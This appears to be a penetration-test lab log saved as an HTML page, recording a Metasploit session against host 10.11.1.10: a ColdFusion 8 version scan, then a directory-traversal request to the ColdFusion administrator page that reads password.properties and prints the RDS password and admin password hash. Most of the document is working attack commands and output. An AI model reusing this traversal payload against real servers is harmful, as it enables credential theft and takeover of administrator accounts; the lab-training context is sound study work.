@@ -1,0 +1,47 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>10.11.1.10</title>
+</head><body><br/>
+msf exploit(xampp_webdav_upload_php) &gt; use auxiliary/scanner/http/coldfusion_version <br/>
+msf auxiliary(coldfusion_version) &gt; show options<br/>
+<br/>
+Module options (auxiliary/scanner/http/coldfusion_version):<br/>
+<br/>
+&nbsp; &nbsp;Name &nbsp; &nbsp; Current Setting &nbsp;Required &nbsp;Description<br/>
+&nbsp; &nbsp;---- &nbsp; &nbsp; --------------- &nbsp;-------- &nbsp;-----------<br/>
+&nbsp; &nbsp;Proxies &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; no &nbsp; &nbsp; &nbsp; &nbsp;A proxy chain of format type:host:port[,type:host:port][...]<br/>
+&nbsp; &nbsp;RHOSTS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; The target address range or CIDR identifier<br/>
+&nbsp; &nbsp;RPORT &nbsp; &nbsp;80 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; The target port<br/>
+&nbsp; &nbsp;SSL &nbsp; &nbsp; &nbsp;false &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;no &nbsp; &nbsp; &nbsp; &nbsp;Negotiate SSL/TLS for outgoing connections<br/>
+&nbsp; &nbsp;THREADS &nbsp;1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; The number of concurrent threads<br/>
+&nbsp; &nbsp;VHOST &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; no &nbsp; &nbsp; &nbsp; &nbsp;HTTP server virtual host<br/>
+<br/>
+msf auxiliary(coldfusion_version) &gt; set rhosts 10.11.1.10<br/>
+rhosts =&gt; 10.11.1.10<br/>
+msf auxiliary(coldfusion_version) &gt; exploit<br/>
+<br/>
+[+] 10.11.1.10: Adobe ColdFusion 8 (Windows (Microsoft-IIS/6.0))<br/>
+[*] Scanned 1 of 1 hosts (100% complete)<br/>
+[*] Auxiliary module execution completed<br/>
+<br/>
+<img src="screenshot.png" /><br/>
+<img src="screenshot 2.png" /><br/>
+<br/>
+[*] URL: 10.11.1.10/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en<br/>
+[+] 10.11.1.10 FILE: #Fri Sep 23 18:27:15 PDT 2011<br/>
+rdspassword=8(^\:(B\#ILU\\]AE2F+L;']2J %]*\:X\\A\=&gt;\n<br/>
+password=AAFDC23870ECBCD3D557B6423A8982134E17927E<br/>
+encrypted=true<br/>
+<br/>
+<br/>
+<img src="screenshot 3.png" /><img src="screenshot 4.png" /><br/>
+<br/>
+<img src="screenshot 5.png" /><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
